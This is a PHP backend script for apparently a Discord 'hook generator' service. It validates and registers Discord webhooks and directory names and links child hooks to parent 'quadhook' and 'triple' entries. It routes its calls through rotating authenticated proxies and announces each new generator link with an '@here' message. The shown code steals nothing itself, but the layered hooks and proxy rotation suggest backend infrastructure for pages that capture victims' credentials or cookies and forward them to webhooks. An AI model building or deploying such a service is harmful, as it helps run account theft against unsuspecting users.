<?php
include_once($_SERVER['DOCUMENT_ROOT'] . '/backend/include.php');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    $webhook = filter_var($data['webhook'], FILTER_SANITIZE_URL);
    if (!$webhook || !filter_var($webhook, FILTER_VALIDATE_URL) ||
        !preg_match('/^https:\/\/(carnary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/', $webhook)) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Invalid webhook.']));
    }

    $name = isset($data['name']) ? filter_var($data['name'], FILTER_SANITIZE_FULL_SPECIAL_CHARS) : null;
    if ($name && !preg_match('/^[A-Za-z0-9]+( [A-Za-z0-9]+)*$/', $name)) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Invalid name.']));
    }

    $directory = filter_var($data['directory'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
    if (!$directory || !preg_match('/^[A-Za-z0-9]{3,20}$/', $directory)) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Directory invalid.']));
    }

    $conn = connect();
    $stmt = $conn->prepare("SELECT webhook, directory FROM Hooks WHERE webhook = ? OR directory = ?");
    $stmt->bind_param("ss", $webhook, $directory);
    $stmt->execute();
    $stmt->bind_result($web, $dir);
    $stmt->fetch();
    $stmt->close();

    if ($web === $webhook) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Webhook already in use.']));
    }

    if ($dir === $directory) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Directory taken.']));
    }

    if (isset($data['icon'])) {
        $icon = filter_var($data['icon'], FILTER_SANITIZE_URL);

        if (!filter_var($icon, FILTER_VALIDATE_URL)) {
            http_response_code(400);
            die(json_encode(['success' => false, 'error' => 'Invalid icon URL.']));
        }

        $proxies = proxy();
        if (empty($proxies) || !is_array($proxies)) {
            http_response_code(500);
            die(json_encode(['success' => false, 'error' => 'No proxies available.']));
        }

        $proxy = $proxies[array_rand($proxies)];

        if (!isset($proxy['ip'], $proxy['port'], $proxy['user'], $proxy['pass'])) {
            http_response_code(500);
            die(json_encode(['success' => false, 'error' => 'Proxy error.']));
        }

        $ch = curl_init($icon);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => true,
            CURLOPT_NOBODY => true,
            CURLOPT_PROXY => $proxy['ip'] . ':' . $proxy['port'],
            CURLOPT_PROXYUSERPWD => $proxy['user'] . ':' . $proxy['pass'],
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_TIMEOUT => 10,
        ]);

        $response = curl_exec($ch);
        $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $content = curl_getinfo($ch, CURLINFO_CONTENT_TYPE);

        if ($code !== 200 || !preg_match('/^image\//', $content)) {
            curl_close($ch);
            http_response_code(400);
            die(json_encode(['success' => false, 'error' => 'Icon is not a valid image.']));
        }

        curl_close($ch);
    }

    $proxies = proxy();
    if (empty($proxies) || !is_array($proxies)) {
        http_response_code(500);
        die(json_encode(['success' => false, 'error' => 'No proxies.']));
    }

    $proxy = $proxies[array_rand($proxies)];

    $ch = curl_init($webhook);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_PROXY => $proxy['ip'] . ':' . $proxy['port'],
        CURLOPT_PROXYUSERPWD => $proxy['user'] . ':' . $proxy['pass'],
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => true,
        CURLOPT_TIMEOUT => 10
    ]);

    curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($code !== 200) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Webhook failed.']));
    }

    $embed_name = '';
    $embed_color = '';

    if (isset($data['hookDir'])) {
        $stmt = $conn->prepare("SELECT id, name, color FROM Hooks WHERE directory = ?");
        $stmt->bind_param("s", $data['hookDir']);
        $stmt->execute();
        $stmt->bind_result($hookId, $hookName, $hookColor);
        if ($stmt->fetch()) {
            $embed_name = $hookName ?? $embed_name;
            $embed_color = $hookColor ?? $embed_color;
        }
        $stmt->close();
    }

    if (!$embed_name) {
        $embed_name = $s['app']['embed']['name'];
        $embed_color = $s['app']['embed']['color'];
    }

    $quad = 0;
    $triple = 0;

    if (isset($data['type']) && $data['type'] === 'quadhook') {
        $quad = 1;
        $triple = 0;
    } elseif (isset($data['hookDir'])) {
        $stmt = $conn->prepare("SELECT id, is_quad FROM Hooks WHERE directory = ?");
        $stmt->bind_param("s", $data['hookDir']);
        $stmt->execute();
        $stmt->bind_result($hook_id, $is_quad);
        $stmt->fetch();
        $stmt->close();

        if (!$hook_id) {
            http_response_code(400);
            die(json_encode(['success' => false, 'error' => 'Parent hook not found.']));
        }

		if ($is_quad < 2) {
			$triple = 0;
			$quad = $hook_id;
		} else {
			$quad = false;
            $triple = $hook_id;
        }
    }

    $id = gi($conn);
    $stmt = $conn->prepare("INSERT INTO Hooks (id, name, directory, icon, color, webhook, is_quad, is_triple) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("issssssi", $id, $name, $directory, $icon, $data['color'], $webhook, $quad, $triple);
    $stmt->execute();
    $stmt->close();

    $link = short("https://" . $_SERVER['HTTP_HOST'] . "/generator/" . $directory . "/create");

    $payload = [
        "content" => "||@here||",
        "embeds" => [
            [
                "title" => "`$embed_name - New Hook Generated`", 
                "description" => "```$link```\n or click [here]($link) to open the hook.",
                "color" => hexdec(ltrim($embed_color, '#')),
            ]
        ],
        "attachments" => []
    ];

    $ch = curl_init($webhook);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => [
            "Content-Type: application/json"
        ],
        CURLOPT_PROXY => $proxy['ip'] . ':' . $proxy['port'],
        CURLOPT_PROXYUSERPWD => $proxy['user'] . ':' . $proxy['pass'],
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
    ]);

    $response = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    curl_close($ch);

    echo json_encode(['success' => true, 'url' => 'https://' . $_SERVER['HTTP_HOST'] . '/generator/' . $directory . "/create"]);
}

function gi($conn) {
    do {
        $id = rand(9999999, 99999999);

        $stmt = $conn->prepare("SELECT id FROM Hooks WHERE id = ?");
        $stmt->bind_param("i", $id);
        $stmt->execute();
        $stmt->store_result();

        $exists = $stmt->num_rows > 0;
        $stmt->close();
    } while ($exists);

    return $id;
}